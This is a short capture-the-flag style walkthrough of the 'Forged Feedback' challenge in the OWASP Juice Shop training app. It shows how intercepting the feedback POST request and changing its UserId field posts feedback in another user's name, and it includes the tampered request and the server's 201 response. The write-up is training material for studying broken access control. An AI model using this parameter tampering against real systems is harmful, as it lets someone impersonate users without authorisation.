# Forged Feedback
**Description**
Post some feedback in another user's name.

Style: Tutorial
Topic: Broken Access Control

## Solution
First let's logg-in as some user, preferably admin...

Went to `/#/contact` page, then went to burp to search for IDOR.

I see a `POST` call to `/api/Feedbacks/` with a payload

```json
{
    "UserId":1,
    "captchaId":0,
    "captcha":"14",
    "comment":"Feedback is here!! (***in@juice-sh.op)",
    "rating":2
}
```

It's weird that there is a `UserId`. so what if I switch it...
Just changed the `UserId` to something else

```json
{
    "UserId":3,
    "captchaId":0,
    "captcha":"14",
    "comment":"Feedback is here!! (***in@juice-sh.op)",
    "rating":2
}
```

And it returned a `201 Created` response

```json
{
    "status":"success",
    "data":{
        "id":10,
        "UserId":3,
        "comment":"Feedback is here!! (***in@juice-sh.op)",
        "rating":2,
        "updatedAt":"2026-06-13T09:01:47.176Z",
        "createdAt":"2026-06-13T09:01:47.176Z"
    }
}
```